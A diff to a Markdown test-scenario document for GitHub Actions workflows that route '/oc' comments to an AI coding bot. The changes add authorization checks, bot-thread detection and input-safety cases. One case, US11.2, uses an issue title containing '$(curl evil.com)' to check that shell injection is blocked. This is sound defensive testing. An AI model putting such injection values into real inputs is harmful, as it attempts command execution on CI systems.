@@ -13,6 +13,11 @@ actions, and the expected system behavior.
 
 ---
 
+> **Security note:** All `/oc` command bodies are passed through `env:`
+> variables (not inline `${{ toJSON() }}`) to prevent shell injection.
+> Issue titles are also passed via env vars to prevent command substitution
+> in generated branch names and PR titles.
+
 ## US01 — Unknown user opens an issue
 
 **Preconditions:** None.
@@ -84,7 +89,8 @@ no `OWNER`, `MEMBER`, or `COLLABORATOR` association.
 - [ ] `opencode-pr-review.yml` fires but the `review` job `if` condition
       fails on the authorization check.
 - [ ] `opencode-pr-comment.yml` fires but the `route` job `if` condition
-      fails on the same check.
+      fails on the authorization check **and** the PR guard
+      (`github.event.issue.pull_request`).
 - [ ] **Expected:** Both workflows skip. No AI runs. No review is posted.
 
 ### US05.3 — Unknown user comments `/oc implement` on an issue
@@ -338,7 +344,8 @@ have been started by the bot (`opencode-agent[bot]`) or by a human.
       authored by `opencode-agent[bot]` → `is_bot_thread=true`.
 - [ ] opencode runs Process 2 prompt with the thread context.
 - [ ] **Expected:** Opencode replies in the thread answering the question.
-      If the user asked for a fix, opencode pushes a commit.
+      If the user asked for a fix, opencode **pushes a commit** (process-2
+      has `contents: write` permission) and replies linking the commit.
 
 ### US10.3 — Unknown user replies `/oc` in a user-owned thread
 
@@ -388,9 +395,55 @@ have been started by the bot (`opencode-agent[bot]`) or by a human.
 - [ ] `opencode-pr-comment.yml` fires again. `route` passes.
 - [ ] `auth.sh` → `IS_OC_COMMAND=false` (or `true` if they use `/oc`).
 - [ ] `route` determines `process-2` (bot thread reply).
+- [ ] `thread-check` checks the **immediately preceding comment** (`.[-2]`
+      from the comments API) — if it was from `opencode-agent[bot]`,
+      `IS_BOT_THREAD=true`.
 - [ ] Process 2 runs again with the updated thread context.
 - [ ] **Expected:** Opencode continues the discussion, maintaining context
       from the entire thread history.
+
+**Note:** Bot thread detection checks only the comment immediately before
+the current one, not all historical bot comments. This prevents false
+positives where a human comment between two bot comments would incorrectly
+route to Process 2.
+
+---
+
+## US11 — Edge cases and input safety
+
+**Preconditions:** Various.
+
+### US11.1 — `/oc reviewtask` does NOT trigger Process 1
+
+- [ ] Known user comments `/oc reviewtask please` on a PR.
+- [ ] `auth.sh` parses → the `review` regex requires a word boundary
+      (`$` or whitespace) after `review`, so `reviewtask` does NOT match.
+- [ ] `SUBCOMMAND=discuss` (falls through to default).
+- [ ] `opencode-pr-review.yml` still triggers (starts with `/oc`, not
+      `/oc task` or `/oc implement`), so Process 1 runs.
+- [ ] **Expected:** Process 1 runs with `SUBCOMMAND=discuss`. The AI
+      treats it as a general review request.
+
+### US11.2 — Issue title with special characters is safe
+
+- [ ] Known user creates an issue titled: `Feature: $(curl evil.com) test``.
+- [ ] Another user comments `/oc implement` on it.
+- [ ] `opencode-issue-handler.yml` passes `ISSUE_TITLE` via `env:` —
+      the `$(curl ...)` is NOT executed by the shell.
+- [ ] The slug sanitization strips non-alphanumeric characters, producing
+      `feature-curl-evilcom-test`.
+- [ ] **Expected:** Branch name is `opencode/issue-42-feature-curl-evilcom-test`.
+      No command execution occurs.
+
+### US11.3 — PR guard prevents issue comments from reaching PR workflows
+
+- [ ] Known user comments `/oc` on a plain issue (not a PR).
+- [ ] `opencode-pr-comment.yml` fires on `issue_comment`.
+- [ ] The `route` job `if` condition includes
+      `(github.event_name != 'issue_comment' || github.event.issue.pull_request)`.
+      For plain issues, this evaluates to `false`.
+- [ ] **Expected:** `opencode-pr-comment.yml` skips. Only
+      `opencode-issue-handler.yml` handles the comment.
 
 ---
 
@@ -429,3 +482,6 @@ have been started by the bot (`opencode-agent[bot]`) or by a human.
 | 10.5 | Unknown | Reply in user thread (no `/oc`) | PR | None | — |
 | 10.6 | Known | `/oc task` in bot thread (inline) | PR | **Process 3** (not 6) | pr-comment |
 | 10.7 | Known | Reply to ongoing bot thread | PR | **Process 2** | pr-comment |
+| 11.1 | Known | `/oc reviewtask` on PR | PR | **Process 1** (discuss) | pr-review |
+| 11.2 | Known | `/oc implement` on issue with `$(...)` title | Issue | **Process 5** (safe) | issue-handler |
+| 11.3 | Known | `/oc` on plain issue (not PR) | Issue | Skipped by pr-comment, handled by issue-handler | — |
